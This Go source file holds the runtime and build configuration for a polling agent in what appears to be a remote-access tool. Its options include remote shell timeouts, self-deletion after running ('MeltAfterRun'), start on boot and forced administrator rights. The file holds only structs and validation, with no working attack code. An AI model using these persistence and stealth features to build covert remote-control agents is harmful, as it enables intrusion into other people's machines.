package agent

import (
	"errors"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/rootbay/tenvy-client/internal/protocol"
)

const (
	statusOnline  = "online"
	statusOffline = "offline"

	maxBufferedResults  = 50
	defaultPollInterval = 5 * time.Second
	defaultBackoff      = 30 * time.Second
	defaultShellTimeout = 30 * time.Second
)

// RuntimeOptions defines the dependencies and configuration required to run an
// agent instance.
type RuntimeOptions struct {
	Logger         *log.Logger
	HTTPClient     *http.Client
	ServerURL      string
	SharedSecret   string
	Preferences    BuildPreferences
	Metadata       protocol.AgentMetadata
	BuildVersion   string
	ShutdownGrace  time.Duration
	TimingOverride TimingOverride
}

// TimingOverride allows build-time or environment overrides for default
// intervals used by the runtime.
type TimingOverride struct {
	PollInterval time.Duration
	MaxBackoff   time.Duration
	ShellTimeout time.Duration
}

// BuildPreferences mirrors the build-time preferences that can be embedded in
// the binary.
type BuildPreferences struct {
	InstallPath   string
	MeltAfterRun  bool
	StartupOnBoot bool
	MutexKey      string
	ForceAdmin    bool
}

// Validate verifies that all required runtime options have been provided.
func (o RuntimeOptions) Validate() error {
	if o.Logger == nil {
		return errors.New("runtime options missing logger")
	}
	if o.HTTPClient == nil {
		return errors.New("runtime options missing http client")
	}
	if strings.TrimSpace(o.ServerURL) == "" {
		return errors.New("runtime options missing server url")
	}
	if strings.TrimSpace(o.BuildVersion) == "" {
		return errors.New("runtime options missing build version")
	}
	return nil
}

// ensureDefaults configures derived default values for runtime options.
func (o *RuntimeOptions) ensureDefaults() {
	if o.HTTPClient == nil {
		o.HTTPClient = &http.Client{Timeout: 60 * time.Second}
	}
	if o.ShutdownGrace <= 0 {
		o.ShutdownGrace = 5 * time.Second
	}
}
